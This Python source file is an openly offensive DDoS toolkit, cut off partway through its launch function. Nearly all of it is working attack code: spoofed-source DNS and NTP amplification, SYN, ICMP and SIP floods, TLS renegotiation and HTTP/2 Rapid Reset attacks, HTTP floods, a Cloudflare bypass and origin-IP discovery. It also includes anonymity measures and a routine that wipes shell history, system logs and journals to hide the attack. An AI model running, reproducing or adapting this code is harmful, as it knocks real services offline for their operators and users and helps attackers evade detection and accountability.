#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                   ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗ ██████╗ ███████╗║
║                   ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝ ██╔════╝║
║                   ██████╔╝██║     ███████║██║     █████╔╝ ██║██║      █████╗  ║
║                   ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║██║     ║██╔══╝  ║
║                   ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║╚██████╔╝███████╗║
║                   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝║
║                                                                               ║
║        ULTIMATE + SAPHYRA ENGINE — RED TEAM ONLY                              ║
║        Kali Live Compatible — Tolerant Mode + L5/L6 Attacks                   ║
║        Extern Established 2025                                                ║
╚═══════════════════════════════════════════════════════════════════════════════╝

[TRACEABILITY NOTICE]
  • Attacks marked ⚠️ send raw packets directly from your network.
    Your real IP will be visible to your ISP and upstream routers.
  • Attacks marked 🌐 use HTTP/HTTPS and can be routed through proxies,
    hiding your IP from the target.
  • Always use proxies for HTTP attacks; raw packet attacks are always
    traceable back to your machine.
"""

import os
import sys
import subprocess
import platform
import random
import time
import threading
import socket
import struct
import base64
import hashlib
import ssl
import http.client
import urllib.request
import urllib.parse
import re
from urllib.parse import urlparse

# ================================================================
# DEPENDENCY INSTALLER (tolerant – never exits)
# ================================================================
REQUIRED = ['scapy', 'requests', 'h2', 'termcolor', 'cryptography', 'dnspython']
INSTALLED_MODULES = {}

def install_deps():
    """Install missing dependencies if possible; always returns without exiting."""
    missing = []
    for pkg in REQUIRED:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            missing.append(pkg)

    if not missing:
        print("[+] All dependencies satisfied.")
        return

    print(f"[!] Missing: {', '.join(missing)}")
    print("[*] Attempting to install missing packages...")

    # Try apt first for system packages
    apt_packages = {
        'scapy': 'python3-scapy',
        'requests': 'python3-requests',
        'cryptography': 'python3-cryptography',
        'dnspython': 'python3-dnspython'
    }
    for pkg in missing[:]:
        if pkg in apt_packages:
            try:
                subprocess.check_call(['apt', 'install', '-y', apt_packages[pkg]],
                                      stderr=subprocess.DEVNULL)
                missing.remove(pkg)
                print(f"[+] Installed {pkg} via apt")
            except:
                pass

    # Then try pip (with --break-system-packages for Kali)
    if missing:
        print(f"[*] Trying pip for: {', '.join(missing)}")
        for pkg in missing[:]:
            try:
                subprocess.check_call(['pip3', 'install', pkg],
                                      stderr=subprocess.DEVNULL)
                missing.remove(pkg)
                print(f"[+] Installed {pkg} via pip")
            except:
                try:
                    subprocess.check_call(['pip3', 'install', '--break-system-packages', pkg],
                                          stderr=subprocess.DEVNULL)
                    missing.remove(pkg)
                    print(f"[+] Installed {pkg} via pip (--break-system-packages)")
                except:
                    pass

    # Fallback: offline packages
    if missing and os.path.isdir('offline_packages'):
        print("[*] Trying offline_packages/...")
        folder_map = {
            'scapy': 'scapy-master',
            'requests': 'requests-main',
            'h2': 'h2-master',
            'termcolor': 'termcolor-main',
            'cryptography': 'cryptography-main',
            'dnspython': 'dnspython-main'
        }
        for pkg in missing[:]:
            folder = folder_map.get(pkg)
            if folder and os.path.isdir(f'offline_packages/{folder}'):
                try:
                    subprocess.check_call(
                        ['pip3', 'install', f'offline_packages/{folder}'],
                        stderr=subprocess.DEVNULL
                    )
                    missing.remove(pkg)
                    print(f"[+] Installed {pkg} from offline_packages/{folder}")
                except Exception as e:
                    print(f"[!] Failed to install {pkg} from offline: {e}")
            else:
                print(f"[!] No offline folder for {pkg}")

    # Final fallback: virtual environment
    if missing:
        print("[*] Trying virtual environment...")
        if not os.path.exists('.venv'):
            subprocess.check_call(['python3', '-m', 'venv', '.venv'])
        for pkg in missing:
            try:
                subprocess.check_call(['.venv/bin/pip', 'install', pkg])
                missing.remove(pkg)
                print(f"[+] Installed {pkg} in virtual environment")
            except:
                print(f"[!] Failed to install {pkg} even in venv.")

    if missing:
        print("[WARN] The following packages are still missing and will be disabled:")
        for pkg in missing:
            print(f"  - {pkg}")
    print("[*] Continuing with available modules.\n")

install_deps()

# ================================================================
# IMPORT MODULES WITH FALLBACK FLAGS
# ================================================================
HAS_SCAPY = False
HAS_REQUESTS = False
HAS_H2 = False
HAS_TERMCOLOR = False
HAS_CRYPTO = False
HAS_DNSPYTHON = False

try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, TCP, ICMP, ARP, Ether
    HAS_SCAPY = True
except ImportError:
    pass

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    pass

try:
    import h2.connection
    import h2.events
    HAS_H2 = True
except ImportError:
    pass

try:
    from termcolor import colored
    HAS_TERMCOLOR = True
except ImportError:
    def colored(text, color=None, attrs=None):
        return text
    print("[WARN] termcolor not available – colours disabled.")

try:
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.primitives.asymmetric import x25519
    HAS_CRYPTO = True
except ImportError:
    pass

try:
    import dns.resolver
    HAS_DNSPYTHON = True
except ImportError:
    pass

# ================================================================
# LOAD SAPHYRA LISTS FROM sphyra.txt (fixed)
# ================================================================
SAPHYRA_USERAGENTS = []
SAPHYRA_REFERERS = []

def load_saphyra_lists_from_file():
    global SAPHYRA_USERAGENTS, SAPHYRA_REFERERS
    if not os.path.exists('sphyra.txt'):
        print(colored("[!] sphyra.txt not found! Please place it in the same directory.", 'red'))
        return
    try:
        with open('sphyra.txt', 'r') as f:
            code = f.read()
        namespace = {
            'headers_useragents': [],
            'headers_referers': []
        }
        exec(code, namespace)
        SAPHYRA_USERAGENTS = namespace['init_useragent_list']()
        SAPHYRA_REFERERS = namespace['init_referer_list']()
        if not SAPHYRA_USERAGENTS or not SAPHYRA_REFERERS:
            print(colored("[!] Loaded empty lists from sphyra.txt. Check your file.", 'red'))
        else:
            print(colored(f"[SAPHYRA] Loaded {len(SAPHYRA_USERAGENTS)} UAs and {len(SAPHYRA_REFERERS)} referers from sphyra.txt.", 'green'))
    except Exception as e:
        print(colored(f"[!] Failed to load sphyra.txt: {e}", 'red'))

load_saphyra_lists_from_file()

# ================================================================
# GLOBALS
# ================================================================
TARGET_IP = ""
TARGET_DOMAIN = ""
USE_HPING3 = False
PROXY_LIST = []
USE_FLARE = False
SNI_SPOOF = "www.google.com"
PAYLOAD = "hidden"
WAF_TAMPER = False
THREADS = 50
COUNT = 100
INTERVAL = 0.01
ATTACK_MODES = []
STEALTH_MODE = False
ORIGIN_IP = None

# ================================================================
# PROXY & STEALTH HELPERS
# ================================================================
def load_proxies(filepath='proxies.txt'):
    global PROXY_LIST
    if os.path.exists(filepath):
        with open(filepath) as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
    else:
        PROXY_LIST = ['socks5://127.0.0.1:9050']

def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

def random_mac():
    return ':'.join(['%02x' % random.randint(0x00, 0xff) for _ in range(6)])

def set_random_mac(interface='eth0'):
    if platform.system().lower() != 'linux':
        return
    try:
        new_mac = random_mac()
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True, stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], check=True, stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True, stderr=subprocess.DEVNULL)
        print(colored(f"[OPsec] MAC randomized to {new_mac}", 'green'))
    except Exception as e:
        print(colored(f"[!] MAC change failed: {e}", 'yellow'))

def random_delay(min_sec=5, max_sec=30):
    delay = random.uniform(min_sec, max_sec)
    print(colored(f"[OPsec] Delaying attack start by {delay:.2f} seconds...", 'yellow'))
    time.sleep(delay)

def random_jitter(base_interval=0.01, jitter=0.005):
    return base_interval + random.uniform(-jitter, jitter)

# ================================================================
# TRACE WIPING (for stealth mode)
# ================================================================
def wipe_traces():
    """Wipe bash history, apt logs, system journals, pip cache, temp files."""
    print(colored("[OPsec] Wiping all traces...", 'yellow'))
    try:
        subprocess.run('history -c', shell=True, executable='/bin/bash', stderr=subprocess.DEVNULL)
        subprocess.run('rm -f ~/.bash_history ~/.zsh_history /root/.bash_history', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('rm -f /var/log/apt/*.log', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('journalctl --rotate', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('journalctl --vacuum-time=1s', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('rm -rf ~/.cache/pip /root/.cache/pip', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('rm -rf /tmp/* /dev/shm/*', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('echo "" > /var/log/syslog', shell=True, stderr=subprocess.DEVNULL)
        print(colored("[+] Traces wiped successfully.", 'green'))
    except Exception as e:
        print(colored(f"[!] Partial wipe: {e}", 'red'))

# ================================================================
# CDN DETECTION (requires dns.resolver and requests)
# ================================================================
def detect_cdn(domain):
    info = {'cdn': None, 'origin_ip': None, 'headers': {}}
    if HAS_DNSPYTHON:
        try:
            answers = dns.resolver.resolve(domain, 'CNAME')
            for rdata in answers:
                cname = str(rdata.target).lower()
                if 'cloudfront.net' in cname:
                    info['cdn'] = 'AWS CloudFront'
                elif 'cloudflare.net' in cname:
                    info['cdn'] = 'Cloudflare'
        except:
            pass
    if HAS_REQUESTS:
        try:
            r = requests.head(f"https://{domain}", timeout=5, verify=False)
            headers = r.headers
            if 'cf-ray' in headers or 'cf-cache-status' in headers:
                info['cdn'] = 'Cloudflare'
            if 'x-amz-cf-id' in headers or 'x-amz-request-id' in headers:
                info['cdn'] = 'AWS CloudFront'
            info['headers'] = headers
        except:
            pass
    # Try origin IP via socket (always available)
    common_subs = ['www', 'api', 'mail', 'ftp', 'admin', 'origin', 'direct']
    for sub in common_subs:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            if ip != socket.gethostbyname(domain):
                info['origin_ip'] = ip
                break
        except:
            pass
    return info

def resolve_target(input_str):
    global TARGET_IP, TARGET_DOMAIN, ORIGIN_IP
    try:
        socket.inet_aton(input_str)
        TARGET_IP = input_str
        TARGET_DOMAIN = input_str
        print(colored(f"[RESOLVE] Direct IP: {TARGET_IP}", 'green'))
        return TARGET_IP
    except socket.error:
        TARGET_DOMAIN = input_str
        try:
            TARGET_IP = socket.gethostbyname(input_str)
            print(colored(f"[RESOLVE] {input_str} -> {TARGET_IP}", 'green'))
            cdn_info = detect_cdn(input_str)
            if cdn_info['cdn']:
                print(colored(f"[CDN] Detected: {cdn_info['cdn']}", 'yellow'))
                if cdn_info['origin_ip']:
                    print(colored(f"[ORIGIN] Potential origin IP: {cdn_info['origin_ip']}", 'cyan'))
                    if get_input("Use origin IP instead? (yes/no)", default="no").lower() == 'yes':
                        TARGET_IP = cdn_info['origin_ip']
                        print(colored(f"[!] Using origin IP: {TARGET_IP}", 'green'))
            else:
                print(colored("[CDN] No clear CDN detected.", 'green'))
            return TARGET_IP
        except:
            print(colored(f"[!] Failed to resolve {input_str}", 'red'))
            return None

# ================================================================
# ATTACK FUNCTIONS (including L5 and L6)
# ================================================================

# ---- L3/L4 attacks (existing) ----
def dns_amplify(target, reflectors, count, interval):
    if not HAS_SCAPY:
        print(colored("[!] Scapy missing – DNS amplification disabled.", 'red'))
        return
    print(colored(f"[UDP] DNS Amp -> {target}  ⚠️ raw packet (traceable)", 'cyan'))
    for ref in reflectors:
        for _ in range(count):
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            pkt = IP(src=src_ip, dst=ref)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
            send(pkt, verbose=False)
            time.sleep(random_jitter(interval))

def ntp_amplify(target, reflectors, count, interval):
    if not HAS_SCAPY:
        print(colored("[!] Scapy missing – NTP amplification disabled.", 'red'))
        return
    print(colored(f"[UDP] NTP Amp -> {target}  ⚠️ raw packet (traceable)", 'cyan'))
    for ref in reflectors:
        for _ in range(count):
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
            payload = b'\x17\x00\x03\x2a' + b'\x00' * 8
            pkt = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 40, 0, 0, 64, socket.IPPROTO_UDP, 0, socket.inet_aton(src_ip), socket.inet_aton(ref))
            pkt += struct.pack('!HHHH', 123, 123, len(payload)+8, 0) + payload
            sock.sendto(pkt, (ref, 123))
            sock.close()
            time.sleep(random_jitter(interval))

def tcp_syn_flood(target, port=80, count=100, interval=0.01):
    if not HAS_SCAPY:
        print(colored("[!] Scapy missing – TCP SYN flood disabled.", 'red'))
        return
    print(colored(f"[TCP] SYN flood -> {target}:{port}  ⚠️ raw packet (traceable)", 'yellow'))
    for _ in range(count):
        src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        pkt = IP(src=src_ip, dst=target)/TCP(sport=src_port, dport=port, flags='S', seq=random.randint(0, 2**32))
        send(pkt, verbose=False)
        time.sleep(random_jitter(interval))

def icmp_flood(target, count=100, interval=0.01):
    if not HAS_SCAPY:
        print(colored("[!] Scapy missing – ICMP flood disabled.", 'red'))
        return
    print(colored(f"[ICMP] Flood -> {target}  ⚠️ raw packet (traceable)", 'magenta'))
    for _ in range(count):
        src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
        pkt = IP(src=src_ip, dst=target)/ICMP()
        send(pkt, verbose=False)
        time.sleep(random_jitter(interval))

# ---- L5 (Session) attack: SIP INVITE flood ----
def sip_invite_flood(target, port=5060, count=100, interval=0.01):
    if not HAS_SCAPY:
        print(colored("[!] Scapy missing – SIP flood disabled.", 'red'))
        return
    print(colored(f"[SIP] INVITE flood -> {target}:{port}  ⚠️ raw packet (traceable)", 'blue'))
    for _ in range(count):
        src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
        call_id = f"{random.randint(1000,9999)}@{random.randint(1000,9999)}"
        sip_payload = (
            f"INVITE sip:{target} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {src_ip}:{random.randint(1024,65535)};branch=z9hG4bK{random.randint(1000,9999)}\r\n"
            f"From: <sip:{random.randint(1000,9999)}@{src_ip}>;tag={random.randint(1000,9999)}\r\n"
            f"To: <sip:{target}>\r\n"
            f"Call-ID: {call_id}\r\n"
            f"CSeq: 1 INVITE\r\n"
            f"Contact: <sip:{random.randint(1000,9999)}@{src_ip}>\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: 0\r\n\r\n"
        )
        pkt = IP(src=src_ip, dst=target)/UDP(sport=random.randint(1024,65535), dport=port)/Raw(load=sip_payload.encode())
        send(pkt, verbose=False)
        time.sleep(random_jitter(interval))

# ---- L6 (Presentation) attack: TLS renegotiation ----
def tls_renegotiation_attack(target, port=443, count=100, interval=0.01, sni_spoof='www.google.com'):
    print(colored(f"[TLS] Renegotiation attack -> {target}:{port}  🌐 TLS (proxy‑capable)", 'yellow'))
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    for _ in range(count):
        try:
            sock = socket.create_connection((target, port), timeout=10)
            tls = ctx.wrap_socket(sock, server_hostname=sni_spoof)
            # Initiate renegotiation multiple times
            for _ in range(5):
                try:
                    tls.renegotiate()
                    time.sleep(0.1)
                except:
                    pass
            tls.close()
        except:
            pass
        time.sleep(random_jitter(interval))

# ---- Existing HTTP attacks ----
def create_spoofed_tls_context(sni_domain):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def random_user_agent():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
    ]
    return random.choice(agents)

def cloudflare_bypass_with_flaresolverr(url):
    if not HAS_REQUESTS:
        return None, None
    flare_url = "http://localhost:8191/v1"
    payload = {"cmd": "request.get", "url": url, "maxTimeout": 60000}
    try:
        r = requests.post(flare_url, json=payload, timeout=30)
        if r.status_code == 200:
            result = r.json()
            if result.get('status') == 'ok':
                solution = result['solution']
                cookies = {c['name']: c['value'] for c in solution.get('cookies', [])}
                return cookies, solution.get('userAgent')
    except:
        pass
    return None, None

def http2_rapid_reset_evasive(target, count, port=443, use_flare=False, sni_spoof='www.google.com', payload='', waf_tamper=False):
    if not HAS_REQUESTS or not HAS_H2:
        print(colored("[!] HTTP/2 requires 'requests' and 'h2' – disabled.", 'red'))
        return
    print(colored(f"[HTTP/2] Rapid Reset -> {target}:{port}  🌐 HTTP/2 (proxy‑capable)", 'magenta'))
    cookies = None
    ua = random_user_agent()
    if use_flare:
        cookies, ua = cloudflare_bypass_with_flaresolverr(f"https://{target}")
    ctx = create_spoofed_tls_context(sni_spoof)
    proxy = get_random_proxy()
    if proxy and proxy.startswith('socks5'):
        proxies = {'https': proxy}
        headers = {
            'User-Agent': ua,
            'Accept': '*/*',
            'X-TLS-Payload': base64.b64encode(payload.encode()).decode()
        }
        if waf_tamper:
            headers['X-Oversized'] = 'A' * 9000
        if cookies:
            headers.update(cookies)
        for _ in range(count):
            try:
                requests.get(f"https://{target}/", headers=headers, proxies=proxies, verify=False, timeout=3)
            except:
                pass
            time.sleep(random_jitter(0.01))
        return
    try:
        sock = socket.create_connection((target, port), timeout=5)
        tls = ctx.wrap_socket(sock, server_hostname=sni_spoof)
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        tls.sendall(conn.data_to_send())
        headers_list = [
            (':method', 'GET'),
            (':path', '/'),
            (':scheme', 'https'),
            (':authority', target),
            ('user-agent', ua),
            ('x-tls-payload', base64.b64encode(payload.encode()).decode())
        ]
        if waf_tamper:
            headers_list.append(('x-oversized', 'A' * 9000))
        for _ in range(count):
            sid = conn.get_next_available_stream_id()
            conn.send_headers(sid, headers_list)
            conn.reset_stream(sid)
            tls.sendall(conn.data_to_send())
        tls.close()
    except Exception as e:
        print(colored(f"[!] HTTP/2 error: {e}", 'red'))

def http_hulk_flood(target, port=80, count=100, interval=0.01, use_https=False):
    if not HAS_REQUESTS:
        print(colored("[!] HTTP HULK requires 'requests' – disabled.", 'red'))
        return
    print(colored(f"[HTTP-HULK] Flooding {target}:{port} (HTTPS: {use_https})  🌐 HTTP (proxy‑capable)", 'cyan'))
    methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
    ]
    referers = [
        'https://google.com', 'https://bing.com', 'https://yahoo.com',
        'https://facebook.com', 'https://twitter.com', ''
    ]
    protocol = 'https' if use_https else 'http'
    proxy = get_random_proxy()
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    for _ in range(count):
        method = random.choice(methods)
        ua = random.choice(user_agents)
        ref = random.choice(referers)
        path = f"/?rand={random.randint(1, 1000000)}"
        url = f"{protocol}://{target}:{port}{path}"
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive' if random.choice([True, False]) else 'close',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        if ref:
            headers['Referer'] = ref

        try:
            if method == 'GET':
                requests.get(url, headers=headers, proxies=proxies, timeout=3, verify=False)
            elif method == 'POST':
                requests.post(url, headers=headers, data={'rand': random.randint(1, 9999)}, proxies=proxies, timeout=3, verify=False)
            elif method == 'HEAD':
                requests.head(url, headers=headers, proxies=proxies, timeout=3, verify=False)
            elif method == 'PUT':
                requests.put(url, headers=headers, data=b'x'*random.randint(1, 1024), proxies=proxies, timeout=3, verify=False)
            elif method == 'DELETE':
                requests.delete(url, headers=headers, proxies=proxies, timeout=3, verify=False)
        except:
            pass
        time.sleep(random_jitter(interval))

def saphyra_http_flood(target_url, host, count=0, interval=0.01):
    if not SAPHYRA_USERAGENTS or not SAPHYRA_REFERERS:
        print(colored("[!] Saphyra lists not loaded – skipping Saphyra flood.", 'red'))
        return
    print(colored(f"[SAPHYRA] Flooding {target_url} (host: {host})  🌐 HTTP (proxy‑capable)", 'blue'))
    if target_url.count('/') == 2:
        target_url += '/'
    param_joiner = '&' if '?' in target_url else '?'

    def http_call():
        query = buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
        full_url = target_url + param_joiner + query
        req = urllib.request.Request(full_url)
        req.add_header('User-Agent', random.choice(SAPHYRA_USERAGENTS))
        req.add_header('Cache-Control', 'no-cache')
        req.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        req.add_header('Referer', random.choice(SAPHYRA_REFERERS) + buildblock(random.randint(50, 100)))
        req.add_header('Keep-Alive', str(random.randint(110, 160)))
        req.add_header('Connection', 'keep-alive')
        req.add_header('Host', host)
        try:
            with urllib.request.urlopen(req, timeout=3) as f:
                pass
        except:
            pass

    if count > 0:
        for _ in range(count):
            t = threading.Thread(target=http_call)
            t.start()
            time.sleep(random_jitter(interval))
    else:
        while True:
            t = threading.Thread(target=http_call)
            t.start()
            time.sleep(random_jitter(0.01))

# ---- hping3 ----
def hping3_attack(target, mode='udp', port=80, count=100):
    if not USE_HPING3:
        return
    print(colored(f"[hping3] {mode.upper()} flood -> {target}:{port}  ⚠️ raw packet (traceable)", 'blue'))
    cmd = ['hping3', '-c', str(count), '-p', str(port), '--flood']
    if mode == 'udp':
        cmd.append('--udp')
    elif mode == 'syn':
        cmd.append('--syn')
    elif mode == 'icmp':
        cmd.append('--icmp')
    cmd.append(target)
    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        print("[!] hping3 not found. Install with: sudo apt install hping3")

# ================================================================
# HELPER: buildblock for Saphyra
# ================================================================
def buildblock(size):
    return ''.join(chr(random.randint(41, 91)) for _ in range(size))

# ================================================================
# EASIER CONFIGURATION
# ================================================================
def print_banner():
    print(colored("""
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                         ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗ ██████╗ ███████╗║
    ║                         ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝ ██╔════╝║
    ║                         ██████╔╝██║     ███████║██║     █████╔╝ ██║██║  ███╗█████╗  ║
    ║                         ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║██║   ██║██╔══╝  ║
    ║                         ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║╚██████╔╝███████╗║
    ║                         ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝║
    ║                                                                               ║
    ║       ULTIMATE + SAPHYRA ENGINE — RED TEAM ONLY                              ║
    ║       Kali Live Compatible — Tolerant Mode + L5/L6 Attacks                   ║
    ║       Extern Established 2025                                                ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
    """, 'green', attrs=['bold']))
    print(colored("[LEGAL] You must own the target or have explicit written permission.\n", 'red'))
    print(colored("[TRACEABILITY NOTICE]", 'yellow', attrs=['bold']))
    print(colored("  ⚠️  Raw packet attacks (UDP/TCP/ICMP/SIP/hping3) send packets directly", 'yellow'))
    print(colored("     from your network – your real IP is visible to your ISP.", 'yellow'))
    print(colored("  🌐  HTTP/HTTPS/TLS attacks can be routed through proxies – your IP can", 'yellow'))
    print(colored("     be hidden from the target if you configure proxies correctly.", 'yellow'))
    print(colored("  💡  Always use proxies for HTTP attacks; raw packet attacks are always", 'yellow'))
    print(colored("     traceable back to your machine.\n", 'yellow'))

def get_input(prompt, default=None, choices=None):
    if choices:
        print(f"Options: {', '.join(choices)}")
    val = input(prompt + (f" [{default}] " if default else ": ")).strip()
    if not val and default is not None:
        val = default
    if choices and val not in choices:
        print(f"Invalid choice. Please choose from {choices}.")
        return get_input(prompt, default, choices)
    return val

def configure_attack():
    global TARGET_IP, TARGET_DOMAIN, THREADS, COUNT, INTERVAL, USE_HPING3
    global PROXY_LIST, USE_FLARE, SNI_SPOOF, PAYLOAD, WAF_TAMPER, ATTACK_MODES, STEALTH_MODE

    print("\n" + "="*60)
    print("⚙️  ATTACK CONFIGURATION (step by step)")
    print("="*60)

    # Target
    target_input = get_input("Target (IP or domain)", default="example.com")
    if not resolve_target(target_input):
        return

    # Attack mode selection - easier with checkboxes style
    print("\n📋 Select attack modes (enter numbers separated by commas, or 'all'):")
    modes_list = [
        ("1", "UDP Amplification (DNS+NTP)", "L3/L4", "⚠️ raw"),
        ("2", "TCP SYN Flood", "L3/L4", "⚠️ raw"),
        ("3", "ICMP Flood", "L3", "⚠️ raw"),
        ("4", "SIP INVITE Flood (L5 Session)", "L5", "⚠️ raw"),
        ("5", "TLS Renegotiation (L6 Presentation)", "L6", "🌐 TLS"),
        ("6", "HTTP/2 Rapid Reset", "L7", "🌐 HTTP/2"),
        ("7", "HTTP HULK Flood", "L7", "🌐 HTTP"),
        ("8", "Saphyra HTTP Flood", "L7", "🌐 HTTP"),
        ("9", "hping3 (external)", "L3/L4", "⚠️ raw")
    ]
    for num, name, layer, trace in modes_list:
        print(f"  {num}. {name:30} [{layer}] {trace}")
    mode_choice = get_input("Enter numbers (e.g., 1,3,5) or 'all'", default="1")
    if mode_choice.lower() == 'all':
        ATTACK_MODES = ['udp', 'tcp', 'icmp', 'sip', 'tls', 'http2', 'hulk', 'saphyra', 'hping3']
    else:
        ATTACK_MODES = []
        for ch in mode_choice.replace(' ', '').split(','):
            if ch == '1': ATTACK_MODES.append('udp')
            elif ch == '2': ATTACK_MODES.append('tcp')
            elif ch == '3': ATTACK_MODES.append('icmp')
            elif ch == '4': ATTACK_MODES.append('sip')
            elif ch == '5': ATTACK_MODES.append('tls')
            elif ch == '6': ATTACK_MODES.append('http2')
            elif ch == '7': ATTACK_MODES.append('hulk')
            elif ch == '8': ATTACK_MODES.append('saphyra')
            elif ch == '9': ATTACK_MODES.append('hping3')
    if not ATTACK_MODES:
        ATTACK_MODES = ['udp']

    # Show summary and confirm
    print("\n📌 Selected modes:")
    for mode in ATTACK_MODES:
        layer = "L3/L4" if mode in ['udp','tcp','icmp','hping3'] else ("L5" if mode=='sip' else ("L6" if mode=='tls' else "L7"))
        trace = "⚠️ raw" if mode in ['udp','tcp','icmp','sip','hping3'] else "🌐 proxy"
        print(f"  - {mode.upper():15} [{layer}] {trace}")
    if get_input("Proceed with these modes?", default="yes").lower() != 'yes':
        print("[!] Aborting configuration.")
        return

    # Common parameters
    THREADS = int(get_input("Threads per attack", default="50"))
    COUNT = int(get_input("Packets/requests per attack", default="100"))
    INTERVAL = float(get_input("Base interval (seconds)", default="0.01"))

    # hping3 specific
    if 'hping3' in ATTACK_MODES:
        USE_HPING3 = True
        print("[*] Make sure hping3 is installed (sudo apt install hping3)")
    else:
        USE_HPING3 = False

    # Proxies
    proxy_file = get_input("Proxy file path (optional, leave empty for TOR)", default="")
    if proxy_file:
        load_proxies(proxy_file)
    else:
        load_proxies()
        print(f"[*] Using {len(PROXY_LIST)} proxies (TOR default)")

    # Advanced HTTP options (only if any HTTP mode selected)
    if any(m in ATTACK_MODES for m in ['http2','hulk','saphyra']):
        use_flare_input = get_input("Use FlareSolverr for Cloudflare? (yes/no)", default="no")
        USE_FLARE = use_flare_input.lower() == 'yes'
        SNI_SPOOF = get_input("SNI spoof domain (for TLS)", default="www.google.com")
        PAYLOAD = get_input("Hidden TLS payload (base64 encoded)", default="hidden")
        WAF_TAMPER = get_input("WAF tamper (oversized headers)? (yes/no)", default="no").lower() == 'yes'
    else:
        USE_FLARE = False
        SNI_SPOOF = "www.google.com"
        PAYLOAD = "hidden"
        WAF_TAMPER = False

    # Stealth
    if get_input("Enable stealth mode (MAC randomize, random delay, trace wipe)?", default="yes").lower() == 'yes':
        STEALTH_MODE = True
        set_random_mac('eth0')
        random_delay(5, 30)
    else:
        STEALTH_MODE = False

    print("\n✅ Configuration complete!")

def launch_attack():
    print("\n[+] Starting attack...")
    threads = []
    start_time = time.time()

    if 'udp' in ATTACK_MODES:
        if not HAS_SCAPY:
            print(colored("[!] UDP amplification disabled – scapy missing.", 'red'))
        else:
            dns_refs = input("DNS reflectors (comma-sep): ").split(',')
            ntp_refs = input("NTP reflectors (comma-sep): ").split(',')
            for _ in range(THREADS // 2):
                t1 = threading.Thread(target=dns_amplify, args=(TARGET_IP, dns_refs, COUNT, INTERVAL))
